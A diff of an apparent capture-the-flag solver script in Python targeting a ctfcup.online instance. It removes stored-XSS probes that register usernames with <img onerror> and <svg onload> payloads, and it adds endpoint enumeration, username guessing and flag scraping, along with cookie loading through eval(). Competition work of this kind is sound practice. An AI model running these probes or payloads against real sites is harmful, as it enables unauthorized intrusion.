@@ -1,29 +1,26 @@
-import os, sys, requests, re, urllib.parse
+import os, sys, requests, re
 BASE=os.environ.get("BASE","http://27wg1nxt69l0o1gh.instances.ctfcup.online")
 OUT=open("artifacts/out.txt","w")
 def log(*a):
     s=" ".join(str(x) for x in a); print(s); OUT.write(s+"\n")
-def g(label,r,limit=2500):
-    log("--",label,r.status_code,"len",len(r.content))
-    log(r.text[:limit])
-user="<img src=x onerror=alert(9)>"
-p="pw123456"
 s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
-r=s.post(BASE+"/register",data={"username":user,"password":p},timeout=20,allow_redirects=False)
-g("register evil",r,400)
-r=s.post(BASE+"/login",data={"username":user,"password":p},timeout=20,allow_redirects=False)
-g("login evil",r,400)
-log("cookies",s.cookies.get_dict())
-g("boxes evil",s.get(BASE+"/boxes",timeout=20),1800)
-uenc=urllib.parse.quote(user,safe='')
-g("profile evil",s.get(BASE+"/u/"+uenc,timeout=20),1800)
-g("profile evil2",s.get(BASE+"/u/"+user.replace(' ','%20'),timeout=20),600)
-# try username with quotes
-user2='"><svg onload=alert(1)>'
-s2=requests.Session()
-r=s2.post(BASE+"/register",data={"username":user2,"password":p},timeout=20,allow_redirects=False)
-g("register evil2",r,300)
-r=s2.post(BASE+"/login",data={"username":user2,"password":p},timeout=20,allow_redirects=False)
-g("login evil2",r,300)
-g("boxes evil2",s2.get(BASE+"/boxes",timeout=20),1500)
+try:
+    for k,v in eval(open("artifacts/cookie.txt").read()).items(): s.cookies.set(k,v)
+    log("cookie loaded")
+except Exception as e: log("cookie err",e)
+paths=["/users","/api","/api/boxes","/api/users","/admin/users","/admin","/report","/bot","/flag","/flag.txt","/debug","/health","/stats","/profile","/me","/account","/logout","/box/1.json","/box/1.txt","/box/1?format=json","/box/1/edit","/box/1/delete","/export","/import"]
+for p in paths:
+    try:
+        r=s.get(BASE+p,timeout=20,allow_redirects=False)
+        log(p,"->",r.status_code,"len",len(r.content), repr(r.text[:160]))
+    except Exception as e: log(p,"ERR",e)
+names=["admin","administrator","moderator","mod","oak","professor","red","ash","blue","cynthia","champion","trainer","staff","support","bot","flag","pokebox","admin1","root","Agent"]
+for n in names:
+    try:
+        r=s.get(BASE+"/u/"+n,timeout=20,allow_redirects=False)
+        marker="MISS"
+        m=re.search(r'<h1>(.*?)</h1>',r.text,re.S)
+        if r.status_code==200 and m: marker=m.group(1)
+        log("user",n,"->",r.status_code,marker, re.findall(r'(ctfcup\{[^}]*\})',r.text)[:1])
+    except Exception as e: log("user",n,"ERR",e)
 OUT.close()
